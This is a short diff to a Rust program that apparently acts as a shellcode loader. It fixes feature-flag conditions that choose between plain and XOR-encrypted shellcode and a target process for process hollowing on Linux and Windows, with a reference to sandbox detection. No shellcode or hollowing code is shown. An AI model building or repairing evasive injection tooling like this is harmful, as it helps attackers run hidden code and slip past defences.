@@ -6,13 +6,13 @@ mod rco_process_hollowing_linux;
 #[cfg(target_os = "linux")]
 use rco_process_hollowing_linux::hollow_and_run;
 // Determine which shellcode and target process to use based on features
-#[cfg(all(target_os = "linux", not(features = "xor")))]
+#[cfg(all(target_os = "linux", not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
-#[cfg(all(target_os = "linux", not(features = "xor")))]
+#[cfg(all(target_os = "linux", not(feature = "xor")))]
 const TARGET_PROCESS: &[u8] = rco_config::LINUX_HOLLOWING_TARGET.as_bytes();
-#[cfg(all(target_os = "linux", features = "xor"))]
+#[cfg(all(target_os = "linux", feature = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
-#[cfg(all(target_os = "linux", features = "xor"))]
+#[cfg(all(target_os = "linux", feature = "xor"))]
 const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_HOLLOWING_TARGET;
 
 // Load Windows implementation if the target OS is Windows
@@ -21,14 +21,14 @@ mod rco_process_hollowing_windows;
 #[cfg(windows)]
 use rco_process_hollowing_windows::hollow_and_run;
 // Determine which shellcode and target process to use based on features
-#[cfg(all(windows, not(features = "xor")))]
+#[cfg(all(windows, not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
-#[cfg(all(windows, not(features = "xor")))]
+#[cfg(all(windows, not(feature = "xor")))]
 const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_HOLLOWING_TARGET.as_bytes();
-#[cfg(all(windows, features = "xor"))]
+#[cfg(all(windows, feature = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
-#[cfg(all(windows, features = "xor"))]
-const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_HOLLOWING_TARGET;
+#[cfg(all(windows, feature = "xor"))]
+const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET;
 
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
